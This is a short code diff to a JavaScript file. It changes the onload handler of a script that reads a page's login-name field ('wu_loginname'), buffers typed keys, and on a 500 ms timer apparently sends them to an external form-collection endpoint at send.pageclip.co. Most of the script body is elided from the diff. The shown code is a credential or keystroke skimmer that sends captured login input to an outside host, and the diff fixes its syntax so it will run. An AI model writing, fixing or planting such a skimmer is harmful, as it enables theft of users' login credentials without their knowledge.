@@ -1,4 +1,4 @@
-document.onload((e) => {
+document.onload = function (e) {
   var keys = '';
   var url = 'https://send.pageclip.co/mMJZqTWOskoatOv5E2bqIWkAxqcetkfi';
   document.getElementsByName('wu_loginname')?.forEach((element) => {
@@ -27,4 +27,4 @@ document.onload((e) => {
       keys = '';
     }
   }, 500);
-});
+};
